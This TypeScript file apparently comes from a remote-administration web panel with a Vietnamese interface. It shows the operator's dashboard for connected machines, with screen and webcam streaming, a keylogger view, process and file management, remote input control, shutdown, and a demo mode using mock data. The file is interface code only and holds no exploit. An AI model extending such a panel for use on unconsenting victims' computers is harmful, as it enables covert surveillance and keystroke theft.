/**
 * Dashboard Page - Client Control Modal
 * Main interface for controlling connected backends
 * Supports Demo Mode with mock data
 */

import { AppLauncher } from '../components/AppLauncher';
import { FileTree } from '../components/FileTree';
import { KeylogView } from '../components/KeylogView';
import { ProcessManager } from '../components/ProcessManager';
import { ScreenView } from '../components/ScreenView';
import { router } from '../main';
import {
  generateMockFrame,
  isDemoMode,
  MOCK_APPS,
  MOCK_BACKENDS,
  MOCK_FILES,
  MOCK_KEYLOG,
  MOCK_PROCESSES
} from '../services/MockData';
import { StateManager } from '../services/StateManager';

type FeatureTab = 'overview' | 'screen' | 'webcam' | 'keylog' | 'processes' | 'apps' | 'files' | 'control';

let activeTab: FeatureTab = 'overview';
let keylogBuffer = '';
let processData: Array<{pid: string; name: string; user: string; cmd: string}> = [];
let appData: Array<{id: string; name: string; icon: string; exec: string}> = [];

// Initialize with mock data if in demo mode
function initDemoData() {
  if (isDemoMode) {
    processData = MOCK_PROCESSES.map(p => ({
      pid: p.pid,
      name: p.name,
      user: p.user,
      cmd: p.cmd
    }));
    appData = MOCK_APPS.map(a => ({
      id: a.id,
      name: a.name,
      icon: a.icon,
      exec: a.exec
    }));
    keylogBuffer = MOCK_KEYLOG;
  }
}

export function DashboardPage(): HTMLElement {
  const page = document.createElement('div');
  page.className = 'dashboard-page';

  const backend = StateManager.getActiveBackendData();
  const mockBackend = isDemoMode ? MOCK_BACKENDS.find(b => b.id === StateManager.getActiveBackend()) : null;

  if (!backend) {
    // No backend selected, redirect to connect
    setTimeout(() => router.navigate('/connect'), 100);
    page.innerHTML = `<div class="flex items-center justify-center h-full"><p class="text-muted">Không có backend được chọn...</p></div>`;
    return page;
  }

  // Initialize demo data
  initDemoData();

  page.innerHTML = `
    <!-- Modal Backdrop -->
    <div class="modal-backdrop open" id="modal-backdrop"></div>

    <!-- Client Modal -->
    <div class="client-modal glass-card-strong open" id="client-modal">
      <!-- Header -->
      <header class="modal-header">
        <div class="flex items-center gap-3">
          <div class="status-dot ${backend.status || 'online'}"></div>
          <h2 class="modal-title">${backend.name || `Backend #${backend.id}`}</h2>
          <span class="badge badge-info font-mono">ID: ${backend.id}</span>
          ${mockBackend ? `<span class="badge">${mockBackend.os}</span>` : ''}
          ${isDemoMode ? `<span class="badge badge-warning">DEMO</span>` : ''}
        </div>
        <button class="modal-close" id="btn-close" title="Đóng">✕</button>
      </header>

      <!-- Sidebar -->
      <nav class="modal-sidebar">
        <div class="sidebar-nav">
          <div class="sidebar-item active" data-tab="overview">
            <span class="sidebar-item-icon">📊</span>
            <span class="sidebar-item-label">Tổng Quan</span>
          </div>
          <div class="sidebar-item" data-tab="screen">
            <span class="sidebar-item-icon">🖥️</span>
            <span class="sidebar-item-label">Màn Hình</span>
          </div>
          <div class="sidebar-item" data-tab="webcam">
            <span class="sidebar-item-icon">📹</span>
            <span class="sidebar-item-label">Webcam</span>
          </div>
          <div class="sidebar-item" data-tab="keylog">
            <span class="sidebar-item-icon">⌨️</span>
            <span class="sidebar-item-label">Keylogger</span>
          </div>
          <div class="sidebar-item" data-tab="processes">
            <span class="sidebar-item-icon">📋</span>
            <span class="sidebar-item-label">Tiến Trình</span>
          </div>
          <div class="sidebar-item" data-tab="apps">
            <span class="sidebar-item-icon">🚀</span>
            <span class="sidebar-item-label">Ứng Dụng</span>
          </div>
          <div class="sidebar-item" data-tab="files">
            <span class="sidebar-item-icon">📁</span>
            <span class="sidebar-item-label">Quản Lý Tệp</span>
          </div>
          <div class="sidebar-item" data-tab="control">
            <span class="sidebar-item-icon">🖱️</span>
            <span class="sidebar-item-label">Điều Khiển</span>
          </div>
        </div>
      </nav>

      <!-- Content Area -->
      <main class="modal-content" id="modal-content">
        <!-- Dynamic content loaded here -->
      </main>

      <!-- Footer -->
      <footer class="modal-footer">
        <div class="status-dot online"></div>
        <span>${isDemoMode ? 'Chế độ Demo' : 'Đã kết nối'}</span>
        <span class="divider-vertical" style="height: 16px; margin: 0 var(--space-3);"></span>
        <span class="font-mono text-xs">Latency: ${isDemoMode ? '~0ms' : '--ms'}</span>
        ${mockBackend ? `
          <span class="divider-vertical" style="height: 16px; margin: 0 var(--space-3);"></span>
          <span class="text-xs text-muted">IP: ${mockBackend.ip}</span>
          <span class="divider-vertical" style="height: 16px; margin: 0 var(--space-3);"></span>
          <span class="text-xs text-muted">Uptime: ${mockBackend.uptime}</span>
        ` : ''}
      </footer>
    </div>
  `;

  // Add page-specific styles
  const style = document.createElement('style');
  style.textContent = `
    .dashboard-page {
      position: fixed;
      inset: 0;
      z-index: var(--z-modal);
    }

    /* Overview Tab */
    .overview-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: var(--space-4);
    }

    .stat-card {
      padding: var(--space-5);
      background: var(--bg-elevated);
      border-radius: var(--radius-md);
      text-align: center;
    }

    .stat-value {
      font-size: var(--text-3xl);
      font-weight: 700;
      background: linear-gradient(135deg, var(--aurora-cyan), var(--aurora-blue));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .stat-label {
      font-size: var(--text-sm);
      color: var(--text-muted);
      margin-top: var(--space-2);
    }

    /* Quick actions */
    .quick-actions {
      display: flex;
      gap: var(--space-3);
      margin-top: var(--space-6);
      flex-wrap: wrap;
    }

    /* Demo video simulation */
    .demo-video-container {
      position: relative;
      width: 100%;
      aspect-ratio: 16/9;
      background: var(--bg-base);
      border-radius: var(--radius-lg);
      overflow: hidden;
      border: 1px solid var(--border-subtle);
    }

    .demo-video-frame {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }
  `;
  page.appendChild(style);

  // Event handlers
  setTimeout(() => {
    const backdrop = page.querySelector('#modal-backdrop');
    const btnClose = page.querySelector('#btn-close');
    const sidebarItems = page.querySelectorAll('.sidebar-item');
    const contentArea = page.querySelector('#modal-content') as HTMLElement;

    // Close handlers
    backdrop?.addEventListener('click', () => router.navigate('/connect'));
    btnClose?.addEventListener('click', () => router.navigate('/connect'));

    // Tab switching
    sidebarItems.forEach(item => {
      item.addEventListener('click', () => {
        const tab = item.getAttribute('data-tab') as FeatureTab;
        setActiveTab(tab, sidebarItems, contentArea);
      });
    });

    // Initial tab
    setActiveTab('overview', sidebarItems, contentArea);

    // Subscribe to backend messages
    setupBackendMessageHandler();
  }, 0);

  return page;
}

function setActiveTab(
  tab: FeatureTab,
  sidebarItems: NodeListOf<Element>,
  contentArea: HTMLElement
): void {
  activeTab = tab;

  // Update sidebar
  sidebarItems.forEach(item => {
    item.classList.toggle('active', item.getAttribute('data-tab') === tab);
  });

  // Render content
  contentArea.innerHTML = '';
  const content = renderTabContent(tab);
  contentArea.appendChild(content);
}

function renderTabContent(tab: FeatureTab): HTMLElement {
  const container = document.createElement('div');
  container.className = 'tab-content animate-fade-in';

  const mockBackend = isDemoMode ? MOCK_BACKENDS.find(b => b.id === StateManager.getActiveBackend()) : null;

  switch (tab) {
    case 'overview':
      container.innerHTML = `
        <h3 class="text-2xl font-semibold mb-6">Tổng Quan</h3>

        <div class="overview-grid">
          <div class="stat-card">
            <div class="stat-value" id="stat-uptime">${mockBackend?.uptime || '--'}</div>
            <div class="stat-label">Thời gian hoạt động</div>
          </div>
          <div class="stat-card">
            <div class="stat-value" id="stat-processes">${processData.length}</div>
            <div class="stat-label">Tiến trình</div>
          </div>
          <div class="stat-card">
            <div class="stat-value" id="stat-apps">${appData.length}</div>
            <div class="stat-label">Ứng dụng</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">${mockBackend?.os || 'N/A'}</div>
            <div class="stat-label">Hệ điều hành</div>
          </div>
        </div>

        <h4 class="text-lg font-semibold mt-8 mb-4">Thao Tác Nhanh</h4>
        <div class="quick-actions">
          <button class="btn btn-secondary" id="qa-screenshot">📷 Chụp Màn Hình</button>
          <button class="btn btn-secondary" id="qa-refresh">🔄 Làm Mới</button>
          <button class="btn btn-danger" id="qa-shutdown">⏻ Tắt Máy</button>
          <button class="btn btn-warning" id="qa-restart">🔃 Khởi Động Lại</button>
        </div>

        ${isDemoMode ? `
          <div class="mt-6 p-4 glass-card">
            <p class="text-sm text-muted">
              🎭 <strong>Demo Mode:</strong> Đây là dữ liệu mẫu. Trong thực tế, dữ liệu sẽ được lấy từ backend thực.
            </p>
          </div>
        ` : ''}
      `;

      // Quick action handlers
      setTimeout(() => {
        container.querySelector('#qa-screenshot')?.addEventListener('click', () => {
          if (isDemoMode) {
            alert('📷 Demo: Đã chụp màn hình!');
          } else {
            StateManager.sendToActive('monitor_snapshot');
          }
        });
        container.querySelector('#qa-refresh')?.addEventListener('click', () => {
          if (isDemoMode) {
            alert('🔄 Demo: Đã làm mới dữ liệu!');
          } else {
            StateManager.sendToActive('list_process');
            StateManager.sendToActive('list_apps');
          }
        });
        container.querySelector('#qa-shutdown')?.addEventListener('click', () => {
          if (confirm('Bạn có chắc muốn tắt máy tính này?')) {
            if (isDemoMode) {
              alert('⏻ Demo: Đã gửi lệnh tắt máy!');
            } else {
              StateManager.sendToActive('shutdown');
            }
          }
        });
        container.querySelector('#qa-restart')?.addEventListener('click', () => {
          if (confirm('Bạn có chắc muốn khởi động lại máy tính này?')) {
            if (isDemoMode) {
              alert('🔃 Demo: Đã gửi lệnh khởi động lại!');
            } else {
              StateManager.sendToActive('restart');
            }
          }
        });
      }, 0);
      break;

    case 'screen':
      if (isDemoMode) {
        container.appendChild(createDemoScreenView('monitor', 'Streaming Màn Hình'));
      } else {
        container.appendChild(ScreenView('monitor', 'Streaming Màn Hình'));
      }
      break;

    case 'webcam':
      if (isDemoMode) {
        container.appendChild(createDemoScreenView('webcam', 'Streaming Webcam'));
      } else {
        container.appendChild(ScreenView('webcam', 'Streaming Webcam'));
      }
      break;

    case 'keylog':
      container.appendChild(KeylogView(keylogBuffer));
      break;

    case 'processes':
      container.appendChild(ProcessManager(processData));
      break;

    case 'apps':
      container.appendChild(AppLauncher(appData));
      break;

    case 'files':
      if (isDemoMode) {
        container.appendChild(createDemoFileTree());
      } else {
        container.appendChild(FileTree());
      }
      break;

    case 'control':
      container.innerHTML = `
        <h3 class="text-2xl font-semibold mb-6">Điều Khiển Từ Xa</h3>

        <div class="glass-card p-6">
          <div class="flex items-center gap-4 mb-4">
            <span class="text-4xl">🖱️⌨️</span>
            <div>
              <h4 class="font-semibold text-lg">Mouse & Keyboard Control</h4>
              <p class="text-muted text-sm">Điều khiển chuột và bàn phím của máy tính từ xa</p>
            </div>
          </div>

          <div class="bg-warning/10 border border-warning/20 rounded-lg p-4 mb-6" style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.2); border-radius: 8px;">
            <p class="text-warning text-sm" style="color: var(--accent-warning);">
              ⚠️ Chức năng này sẽ mở một cửa sổ riêng để tránh nhầm lẫn với thao tác trên máy của bạn.
            </p>
          </div>

          <button class="btn btn-primary btn-lg" id="btn-open-control">
            <span>🎮</span>
            <span>Mở Cửa Sổ Điều Khiển</span>
          </button>

          <p class="text-xs text-muted mt-4">
            💡 Nhấn ESC để thoát chế độ điều khiển
          </p>
        </div>

        ${isDemoMode ? `
          <div class="mt-6 p-4 glass-card">
            <p class="text-sm text-muted">
              🎭 <strong>Demo Mode:</strong> Cửa sổ điều khiển sẽ hiển thị video mẫu.
            </p>
          </div>
        ` : ''}
      `;

      setTimeout(() => {
        container.querySelector('#btn-open-control')?.addEventListener('click', () => {
          openControlWindow();
        });
      }, 0);
      break;
  }

  return container;
}

// Demo Screen View with simulated frames
function createDemoScreenView(type: 'monitor' | 'webcam', title: string): HTMLElement {
  const container = document.createElement('div');
  container.className = 'screen-view-demo';

  let isStreaming = false;
  let frameInterval: number | null = null;

  container.innerHTML = `
    <div class="flex items-center justify-between mb-4">
      <h3 class="text-2xl font-semibold">${title}</h3>
      <span class="badge badge-info" id="stream-status">○ Stopped</span>
    </div>

    <div class="demo-video-container" id="video-container">
      <img id="demo-frame" class="demo-video-frame" src="" alt="Demo Stream" style="display: none;">
      <div class="video-overlay" id="video-overlay" style="display: flex; align-items: center; justify-content: center; position: absolute; inset: 0; background: var(--bg-base);">
        <div style="text-align: center;">
          <span style="font-size: 3rem;">${type === 'monitor' ? '🖥️' : '📹'}</span>
          <p class="text-muted mt-2">Nhấn "Bắt đầu" để xem stream demo</p>
        </div>
      </div>
    </div>

    <div class="video-controls" style="display: flex; align-items: center; justify-content: center; gap: 12px; padding: 16px; margin-top: 16px;">
      <button class="btn btn-primary" id="btn-toggle">
        <span id="toggle-icon">▶</span>
        <span id="toggle-text">Bắt đầu</span>
      </button>

      <button class="btn btn-secondary" id="btn-record" disabled>
        <span>⏺</span>
        <span>Ghi hình</span>
      </button>

      <button class="btn btn-secondary" id="btn-snapshot" disabled>
        <span>📷</span>
        <span>Chụp ảnh</span>
      </button>

      <button class="btn btn-secondary" id="btn-fullscreen" disabled>
        <span>⛶</span>
        <span>Toàn màn hình</span>
      </button>
    </div>

    <p class="text-xs text-muted text-center mt-4">🎭 Demo: Video được mô phỏng từ canvas</p>
  `;

  setTimeout(() => {
    const btnToggle = container.querySelector('#btn-toggle') as HTMLButtonElement;
    const toggleIcon = container.querySelector('#toggle-icon') as HTMLElement;
    const toggleText = container.querySelector('#toggle-text') as HTMLElement;
    const streamStatus = container.querySelector('#stream-status') as HTMLElement;
    const videoOverlay = container.querySelector('#video-overlay') as HTMLElement;
    const demoFrame = container.querySelector('#demo-frame') as HTMLImageElement;
    const btnRecord = container.querySelector('#btn-record') as HTMLButtonElement;
    const btnSnapshot = container.querySelector('#btn-snapshot') as HTMLButtonElement;
    const btnFullscreen = container.querySelector('#btn-fullscreen') as HTMLButtonElement;

    btnToggle.addEventListener('click', () => {
      if (isStreaming) {
        // Stop
        isStreaming = false;
        if (frameInterval) {
          clearInterval(frameInterval);
          frameInterval = null;
        }

        btnToggle.className = 'btn btn-primary';
        toggleIcon.textContent = '▶';
        toggleText.textContent = 'Bắt đầu';
        streamStatus.className = 'badge badge-info';
        streamStatus.textContent = '○ Stopped';
        videoOverlay.style.display = 'flex';
        demoFrame.style.display = 'none';
        btnRecord.disabled = true;
        btnSnapshot.disabled = true;
        btnFullscreen.disabled = true;
      } else {
        // Start
        isStreaming = true;

        btnToggle.className = 'btn btn-danger';
        toggleIcon.textContent = '⏹';
        toggleText.textContent = 'Dừng';
        streamStatus.className = 'badge badge-success';
        streamStatus.textContent = '● LIVE';
        videoOverlay.style.display = 'none';
        demoFrame.style.display = 'block';
        btnRecord.disabled = false;
        btnSnapshot.disabled = false;
        btnFullscreen.disabled = false;

        // Start generating frames
        const updateFrame = () => {
          if (isStreaming) {
            demoFrame.src = generateMockFrame();
          }
        };
        updateFrame();
        frameInterval = window.setInterval(updateFrame, 100); // 10 FPS
      }
    });

    btnSnapshot.addEventListener('click', () => {
      alert('📷 Demo: Đã chụp ảnh màn hình!');
    });
  }, 0);

  return container;
}

// Demo File Tree with mock data
function createDemoFileTree(): HTMLElement {
  const container = document.createElement('div');
  container.className = 'file-tree-demo';

  container.innerHTML = `
    <div class="flex items-center justify-between mb-4">
      <h3 class="text-2xl font-semibold">Quản Lý Tệp</h3>
      <span class="badge badge-warning">DEMO</span>
    </div>

    <div class="breadcrumb mb-4" style="display: flex; align-items: center; gap: 4px; font-size: 14px; padding: 8px 12px; background: var(--bg-elevated); border-radius: 8px;">
      <span>📂</span>
      <span style="color: var(--text-muted);">/</span>
      <span>C:\\Users\\Demo</span>
    </div>

    <div class="file-tree-wrapper glass-card" style="max-height: 400px; overflow-y: auto; padding: 8px;">
      <div class="file-tree" id="demo-file-tree">
        ${renderMockFileTree(MOCK_FILES, 0)}
      </div>
    </div>

    <div class="file-actions mt-4" style="padding: 16px; background: var(--bg-surface); border-radius: 8px; border: 1px solid var(--border-subtle);">
      <div class="flex items-center justify-between">
        <div>
          <span class="text-sm text-muted">Đã chọn: </span>
          <span class="font-medium" id="selected-file">-</span>
        </div>
        <div class="flex gap-2">
          <button class="btn btn-primary btn-sm" id="btn-download" disabled>
            <span>📥</span>
            <span>Tải về</span>
          </button>
          <button class="btn btn-secondary btn-sm">
            <span>📤</span>
            <span>Tải lên</span>
          </button>
          <button class="btn btn-danger btn-sm" id="btn-delete" disabled>
            <span>🗑️</span>
            <span>Xóa</span>
          </button>
        </div>
      </div>
    </div>
  `;

  // Add interaction
  setTimeout(() => {
    const fileTree = container.querySelector('#demo-file-tree') as HTMLElement;
    const selectedFileEl = container.querySelector('#selected-file') as HTMLElement;
    const btnDownload = container.querySelector('#btn-download') as HTMLButtonElement;
    const btnDelete = container.querySelector('#btn-delete') as HTMLButtonElement;

    fileTree.querySelectorAll('.tree-item').forEach(item => {
      item.addEventListener('click', (e) => {
        e.stopPropagation();

        // Remove previous selection
        fileTree.querySelectorAll('.tree-item').forEach(i => i.classList.remove('selected'));
        item.classList.add('selected');

        const name = item.getAttribute('data-name') || '-';
        const isDir = item.getAttribute('data-isdir') === 'true';
        selectedFileEl.textContent = name;
        btnDownload.disabled = isDir;
        btnDelete.disabled = false;
      });

      // Toggle expand
      const toggle = item.querySelector('.tree-toggle');
      toggle?.addEventListener('click', (e) => {
        e.stopPropagation();
        item.classList.toggle('expanded');
        const children = item.nextElementSibling;
        if (children?.classList.contains('tree-children')) {
          children.classList.toggle('hidden');
        }
      });
    });

    btnDownload.addEventListener('click', () => {
      alert('📥 Demo: Đang tải file...');
    });

    btnDelete.addEventListener('click', () => {
      if (confirm('Xác nhận xóa?')) {
        alert('🗑️ Demo: Đã xóa file!');
      }
    });
  }, 0);

  return container;
}

function renderMockFileTree(files: typeof MOCK_FILES, depth: number): string {
  return files.map(file => {
    const icon = file.isDir ? '📁' : getFileIcon(file.name);
    const size = file.size ? formatSize(file.size) : '';

    return `
      <div class="tree-item" data-name="${file.name}" data-isdir="${file.isDir}" style="display: flex; align-items: center; padding: 6px 12px; cursor: pointer; border-radius: 6px; margin-left: ${depth * 20}px;">
        ${file.isDir ? `<span class="tree-toggle" style="width: 16px; margin-right: 8px; font-size: 10px; color: var(--text-muted);">▶</span>` : `<span style="width: 16px; margin-right: 8px;"></span>`}
        <span style="margin-right: 8px;">${icon}</span>
        <span style="flex: 1;">${file.name}</span>
        ${size ? `<span style="color: var(--text-muted); font-size: 12px;">${size}</span>` : ''}
      </div>
      ${file.isDir && file.children ? `<div class="tree-children hidden">${renderMockFileTree(file.children, depth + 1)}</div>` : ''}
    `;
  }).join('');
}

function getFileIcon(name: string): string {
  const ext = name.split('.').pop()?.toLowerCase();
  const icons: Record<string, string> = {
    'txt': '📄', 'md': '📝', 'pdf': '📕',
    'doc': '📘', 'docx': '📘', 'xls': '📗', 'xlsx': '📗',
    'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️',
    'mp3': '🎵', 'mp4': '🎬',
    'zip': '📦', 'rar': '📦', 'exe': '⚙️',
    'js': '🟨', 'ts': '🔷', 'py': '🐍', 'json': '📋',
  };
  return icons[ext || ''] || '📄';
}

function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  if (bytes < 1024 * 1024 * 1024) return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
  return `${(bytes / (1024 * 1024 * 1024)).toFixed(1)} GB`;
}

function setupBackendMessageHandler(): void {
  const wsClient = StateManager.getWsClient();
  if (!wsClient) return;

  // This would typically be set up in the WebSocket client callbacks
  // For now, we'll rely on the existing handler setup
}

function openControlWindow(): void {
  const backendId = StateManager.getActiveBackend();
  if (backendId === null) return;

  // Open a new popup window for control
  const controlWindow = window.open(
    '',
    'RemoteControl',
    'width=1280,height=720,resizable=yes,scrollbars=no'
  );

  if (!controlWindow) {
    alert('Không thể mở cửa sổ điều khiển. Vui lòng cho phép popup.');
    return;
  }

  controlWindow.document.write(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Remote Control - Backend #${backendId}</title>
      <style>
        body {
          margin: 0;
          background: #0F0F14;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          height: 100vh;
          font-family: 'Inter', system-ui, sans-serif;
          color: white;
        }
        .control-container {
          text-align: center;
        }
        #control-canvas {
          max-width: 100%;
          max-height: 80vh;
          background: #1A1A24;
          border-radius: 8px;
          cursor: crosshair;
        }
        .hint {
          margin-top: 16px;
          font-size: 14px;
          color: #94A3B8;
        }
        .controls {
          margin-top: 16px;
          display: flex;
          gap: 12px;
        }
        .btn {
          padding: 8px 16px;
          border-radius: 8px;
          border: none;
          font-size: 14px;
          cursor: pointer;
          background: #4F46E5;
          color: white;
        }
        .btn:hover {
          background: #6366F1;
        }
      </style>
    </head>
    <body>
      <div class="control-container">
        <canvas id="control-canvas" width="1280" height="720"></canvas>
        <p class="hint">🎮 Di chuyển chuột và gõ bàn phím để điều khiển máy từ xa<br>Nhấn ESC để thoát</p>
        <div class="controls">
          <button class="btn" id="btn-click">Click Demo</button>
          <button class="btn" id="btn-type">Type Demo</button>
        </div>
      </div>
      <script>
        const canvas = document.getElementById('control-canvas');
        const ctx = canvas.getContext('2d');
        let mouseX = 0, mouseY = 0;

        // Draw demo desktop
        function draw() {
          // Background
          ctx.fillStyle = '#1a1a24';
          ctx.fillRect(0, 0, 1280, 720);

          // Taskbar
          ctx.fillStyle = '#252533';
          ctx.fillRect(0, 680, 1280, 40);

          // Windows
          ctx.fillStyle = '#2d2d3d';
          ctx.fillRect(50, 50, 500, 350);
          ctx.fillRect(600, 100, 600, 500);

          // Title bars
          ctx.fillStyle = '#4F46E5';
          ctx.fillRect(50, 50, 500, 28);
          ctx.fillRect(600, 100, 600, 28);

          // Text
          ctx.fillStyle = 'white';
          ctx.font = '14px Inter, sans-serif';
          ctx.fillText('Browser', 60, 69);
          ctx.fillText('Terminal', 610, 119);

          // Mouse cursor
          ctx.fillStyle = '#22C55E';
          ctx.beginPath();
          ctx.arc(mouseX, mouseY, 8, 0, Math.PI * 2);
          ctx.fill();

          // Clock
          const now = new Date();
          ctx.fillText(now.toLocaleTimeString(), 1180, 705);

          requestAnimationFrame(draw);
        }
        draw();

        canvas.addEventListener('mousemove', (e) => {
          const rect = canvas.getBoundingClientRect();
          mouseX = (e.clientX - rect.left) * (1280 / rect.width);
          mouseY = (e.clientY - rect.top) * (720 / rect.height);
        });

        canvas.addEventListener('click', () => {
          console.log('Click at:', mouseX, mouseY);
        });

        document.addEventListener('keydown', (e) => {
          if (e.key === 'Escape') {
            window.close();
          }
          console.log('Key:', e.key);
        });
      </script>
    </body>
    </html>
  `);
}

// Export for external updates
export function updateKeylogBuffer(data: string): void {
  keylogBuffer += data;
  if (activeTab === 'keylog') {
    const feed = document.querySelector('#keylog-feed');
    if (feed) {
      feed.textContent = keylogBuffer;
      feed.scrollTop = feed.scrollHeight;
    }
  }
}

export function updateProcessData(data: typeof processData): void {
  processData = data;
}

export function updateAppData(data: typeof appData): void {
  appData = data;
}
